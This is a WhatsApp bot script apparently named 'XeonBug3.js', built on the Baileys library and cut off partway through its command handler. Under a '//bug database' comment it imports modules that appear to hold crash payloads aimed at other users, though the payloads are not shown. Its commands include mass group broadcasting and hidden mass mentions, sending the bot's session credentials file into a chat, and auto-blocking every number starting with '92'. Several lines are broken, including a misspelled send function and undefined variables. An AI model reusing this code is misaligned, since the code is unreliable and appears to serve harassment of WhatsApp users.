//base by Novi (Novi Bot Inc.)
//YouTube: @Novi Official 
//Instagram: novinnvl_21
//Telegram: t.me/NoviRaiden
//GitHub: @Novi
//WhatsApp: +6287715768324
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@Novi_Novy


const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")

//bug database
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 
module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
    try {
    sendMsg = async (jid, message = {}, options = {}) => {
				return await XeonBotInc.sendMessag(jid, message, { ...options, ephemeralExpiration: 86400 })
			}
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplygcxeon.selectedRowId : (m.mtype == 'templateButtonreplygcxeonMessage') ? m.message.templateButtonlessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplygcxeon.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        expiredCheck(XeonBotInc, m, premium);
//group chat msg by xeon
const hws = await getBuffer(hwaifu[Math.floor(Math.random() * hwaifu.length)])
const reply = (teks) => {
sendMsg(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": hws,
"sourceUrl": `${link}`}}},
{ quoted: m})
}

async function loading () {
var xeonlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await sendMsg(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await sendMsg(from, {text: xeonlod[i], edit: key });
}
}

        if (!XeonBotInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        if (autoread) {
            XeonBotInc.readMessages([m.key])
        }
        if (global.autoTyping) {

        XeonBotInc.sendPresenceUpdate('composing', from)


        }

        if (global.autoRecording) {

        XeonBotInc.sendPresenceUpdate('recording', from)

        }

        
        //bot number online status, available=online, unavailable=offline
        XeonBotInc.sendPresenceUpdate('unavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']

        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]

        XeonBotInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            XeonBotInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('92') && global.anti92 === true) {
            return XeonBotInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await XeonBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(i)}\nFN:${await XeonBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./XeonMedia/audio/${BhosdikaXeon}.mp3`)
sendMsg(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
sendMsg(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
sendMsg(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
sendMsg(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
sendMsg(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
sendMsg(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./XeonMedia/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    reply(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                XeonBotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'addprem':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 2)
                    return reply(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    reply("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    reply("Success")
                }
                break
            case 'delprem':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    reply("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    reply("Success")
                }
                break
            case 'listprem': {
                if (!isCreator) return reply(mess.owner)
                let data = require("./database/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                sendMsg(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return reply(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    reply(teks)
                    await sleep(2000)
                    reply("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    reply("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!isCreator) return reply(mess.owner)
                    if (!text) return reply('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
                    reply(mess.wait)
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    await XeonBotInc.groupAcceptInvite(result).then((res) => reply(json(res))).catch((err) => reply(json(err)))
                } catch {
                    reply('Failed to join the Group')
                }
                break      
            case 'getsession':
                if (!isCreator) return reply(mess.owner)
                reply('Wait a moment, currently retrieving your session file')
                let sesi = await fs.readFileSync('./session/creds.json')
                sendMsg(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
                break
            case 'shutdown':
                if (!isCreator) return reply(mess.owner)
                reply(`Goodbye🖐`)
                await sleep(3000)
                process.exit()
                break
            case 'restart':
                if (!isCreator) return reply(mess.owner)
                reply('In Process....')
                exec('pm2 restart all')
                break
            case 'autoread':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread = true
                    reply(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    reply(`Successfully changed autoread to ${q}`)
                }
                break
                case 'autotyping':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoTyping = true
                    reply(`Successfully changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    reply(`Successfully changed auto-typing to ${q}`)
                }
                break
                case 'autorecording':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoRecording = true
                    reply(`Successfully changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    reply(`Successfully changed auto-recording to ${q}`)
                }
                break
                case 'autorecordtyp':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autorecordtype = true
                    reply(`Successfully changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
                    autorecordtype = false
                    reply(`Successfully changed auto recording and typing to ${q}`)
                }
                break
                case 'autoswview':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q === 'on') {
                    autoread_status = true
                    reply(`Successfully changed auto status/story view to ${q}`)
                } else if (q === 'off') {
                    autoread_status = false
                    reply(`Successfully changed auto status/story view to ${q}`)
                }
                break
            case 'autobio':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    reply(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    reply(`Successfully Changed AutoBio To ${q}`)
                }
                break
            case 'mode':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} public/self`)
                if (q == 'public') {
                    XeonBotInc.public = true
                    reply(mess.done)
                } else if (q == 'self') {
                    XeonBotInc.public = false
                    reply(mess.done)
                }
                break
            case 'setexif':
                if (!isCreator) return reply(mess.owner)
                if (!text) return reply(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                reply(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return reply(mess.owner)
                if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return reply(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.updateBlockStatus(blockw, 'block').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'unblock':
                if (!isCreator) return reply(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.updateBlockStatus(blockww, 'unblock').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'leave':
                if (!isCreator) return reply(mess.owner)
                if (!m.isGroup) return reply(mess.group)
                reply('Bye Everyone 🥺')
                await XeonBotInc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return reply(mess.owner)
                if (m.isGroup) return reply(mess.private)
                reply(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await sendMsg(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return reply(mess.owner)
                if (!text) return reply(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await XeonBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                reply(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    sendMsg(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By Owner',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://telegra.ph/file/c02035e9c30f7b6da1b29.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                reply(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!isCreator) return reply(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("XeonBug3.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                reply(`${getCase(q)}`)
                break
            case 'delete':
            case 'del': {
                if (!isCreator) return reply(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return reply('The message was not sent by a bot!')
                sendMsg(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                reply(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    XeonBotInc.groupSettingUpdate(m.chat, 'announcement')
                    reply(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                reply(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    reply(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'add':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'promote':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'demote':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => reply(json(res))).catch((err) => reply(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!text) return 'Text ?'
                await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!text) return 'Text ?'
                await XeonBotInc.groupUpdateDescription(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await XeonBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                } else {
                    var memeg = await XeonBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let teks = `*👥 Tag All*
 
                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                sendMsg(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                sendMsg(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (!m.quoted) return reply(`Reply messages with captions ${prefix + command}`)
                sendMsg(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
